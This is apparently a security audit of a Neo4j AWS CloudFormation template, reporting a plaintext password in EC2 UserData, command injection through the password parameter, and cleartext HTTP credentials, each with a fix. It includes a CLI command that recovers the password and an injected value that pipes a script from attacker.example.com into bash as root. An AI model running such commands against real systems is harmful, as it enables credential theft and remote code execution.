# Security Review — neo4j-private.template.yaml

Scope: `templates/neo4j-private.template.yaml` (generated template and its UserData boot script).
Findings below are HIGH severity only. Low-severity and informational items are excluded.

---

## Finding 1: Password Embedded in LaunchTemplate UserData (Plaintext)

**File:** `templates/neo4j-private.template.yaml`
**Lines:** 649–651
**Severity:** HIGH

**Description**

The `Password` CloudFormation parameter (`NoEcho: true`) is interpolated directly into the EC2 UserData bash script:

```yaml
- "password=\""
- Ref: Password
- "\"\n"
```

`NoEcho` only hides the value in CloudFormation API responses. It has no effect on the EC2 LaunchTemplate — the base64-encoded UserData is stored permanently in the LaunchTemplate and in every version created by a stack update. Any IAM principal in the account with `ec2:DescribeLaunchTemplateVersions` can recover the password:

```bash
aws ec2 describe-launch-template-versions \
  --launch-template-id lt-0abc123 \
  --query 'LaunchTemplateVersions[0].LaunchTemplateData.UserData' \
  --output text | base64 -d | grep '^password='
```

Old LaunchTemplate versions persist indefinitely and each contains the password active at creation time. The `Neo4jPasswordSecret` Secrets Manager resource (line 1583) stores a parallel copy but does not remove the UserData copy — both exist for the lifetime of the instance.

**Fix**

Remove the password from UserData. The instance should retrieve it at boot from Secrets Manager instead:

```bash
password=$(aws secretsmanager get-secret-value \
  --secret-id "neo4j/${stackName}/password" \
  --query SecretString --output text --region "${region}")
```

`Neo4jRole` needs `secretsmanager:GetSecretValue` on `Neo4jPasswordSecret` added (the bastion role already has this at lines 244–246). After this change the password never appears in the LaunchTemplate.

---

## Finding 2: Password AllowedPattern Permits Shell Metacharacters — Command Injection at Boot

**File:** `templates/neo4j-private.template.yaml`
**Lines:** 59–61 (parameter), 649–651 (injection site)
**Severity:** HIGH

**Description**

The `Password` parameter's `AllowedPattern` is:

```
^(?=.*[a-zA-Z])(?=.*[0-9]).{8,}$
```

This accepts any character that is not a newline, including `$`, `` ` ``, `\`, `;`, `|`, and `&`. The value is injected inside double-quotes in the UserData bash script. In bash, double-quotes do not suppress command substitution (`$(...)`) or variable expansion (`${}`). The UserData runs as root via cloud-init.

A user — or a deployment pipeline — supplying a password such as:

```
Test1234$(curl -sf https://attacker.example.com/payload.sh | bash)
```

passes the `AllowedPattern` check. At instance boot, the shell evaluates:

```bash
password="Test1234$(curl -sf https://attacker.example.com/payload.sh | bash)"
```

The injected command executes as root before Neo4j starts. The attacker gains full instance control, including access to the IAM role's `ec2:AttachVolume`, `autoscaling:DescribeAutoScalingGroups`, and `secretsmanager:GetSecretValue` permissions.

`deploy.py` generates test passwords from `string.ascii_letters + string.digits` only, so automated internal deployments are safe. The vulnerable path is Marketplace deployments where an operator or pipeline supplies the password.

**Fix**

Either:
1. Restrict `AllowedPattern` to alphanumerics: `^[a-zA-Z0-9]{8,}$`
2. Or (preferred, also resolves Finding 1): move the password out of UserData entirely and retrieve it from Secrets Manager at boot, eliminating the injection site.

---

## Finding 3: HTTP Port 7474 Has No TLS — Credentials Transmitted in Cleartext Within VPC

**File:** `templates/neo4j-private.template.yaml`
**Lines:** 1381–1389 (NLB HTTP listener), 118–126 (BoltCertificateSecretArn parameter)
**Severity:** HIGH

**Description**

The NLB listener on port 7474 uses `Protocol: TCP` (raw passthrough). There is no HTTPS option for the HTTP connector in this template. `BoltCertificateSecretArn` enables TLS for Bolt (7687) but has no equivalent for HTTP. In any deployment where the operator does not manually configure HTTPS out-of-band, Neo4j Browser and the REST API operate over cleartext.

When clients authenticate through the browser or direct HTTP API calls, the `Authorization: Basic base64(neo4j:<password>)` header is transmitted in cleartext across the VPC. An attacker who has compromised any VPC host, or who has AWS permissions to configure VPC Traffic Mirroring on the NLB's target ENIs, can capture these frames and decode the credentials without touching Secrets Manager, UserData, or the LaunchTemplate.

**Fix**

Add a `BoltHttpsCertificateSecretArn` parameter mirroring `BoltCertificateSecretArn`. When set, the UserData script should configure Neo4j's HTTPS connector (`server.https.enabled=true`, `dbms.ssl.policy.https.*`) and set `server.http.enabled=false` to disable the cleartext listener. Add a corresponding NLB listener on port 7473 with `Protocol: TCP` (TLS terminates at Neo4j). Until HTTPS is implemented, the operator guide should explicitly note that Neo4j Browser credentials are transmitted in cleartext within the VPC.
